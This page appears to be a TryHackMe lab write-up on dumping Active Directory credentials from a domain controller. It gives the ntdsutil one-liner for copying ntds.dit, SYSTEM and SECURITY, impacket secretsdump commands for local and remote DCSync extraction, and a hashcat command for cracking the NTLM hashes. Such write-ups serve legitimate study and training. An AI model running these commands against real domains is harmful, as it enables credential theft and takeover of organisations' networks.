# Domain Controller

As explained before, New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc. Located in `C:\Windows\NTDS` by default, and it is encrypted to prevent data extraction from a target machine.

***

### <mark style="color:green;">Local Dumping (No Credentials)</mark>

To successfully dump the content of the NTDS file we need the following files:

* <mark style="color:red;">**C:\Windows\NTDS\ntds.dit**</mark>
* <mark style="color:red;">**C:\Windows\System32\config\SYSTEM**</mark>
* <mark style="color:red;">**C:\Windows\System32\config\SECURITY**</mark>

We can use this Powershell one-liner to dump the NTDS file using the Ntdsutil tool in the `C:\temp` directory

```powershell
ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q
```

<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

Inside both of those folders contain the required files we need. In a usual case, we would transfer them on our attacking machine and retrieve the NTLM hashes using impacket's `secretsdump`

```bash
impacket-secretsdump -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```

***

### <mark style="color:green;">Remote Dumping (With Credentials)</mark>

In the previous section, we discussed how to get hashes from memory with no credentials in hand. In this task, we will be showing how to dump a system and domain controller hashes remotely, which requires credentials, such as passwords or NTLM hashes. We also need credentials for users with administrative access to a domain controller or special permissions as discussed in the DC Sync section.

{% embed url="https://mfkrypt.gitbook.io/stuff/ctf-writeups/tryhackme/exploiting-active-directory/exploiting-domain-trusts#dcsync" %}

```bash
impacket-secretsdump -just-dc <DOMAIN>/<AD_ADMIN_USER>@10.10.54.234
```

<figure><img src="../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

Then, attempt to crack it using Hashcat

```
hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.txt
```

<figure><img src="../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>
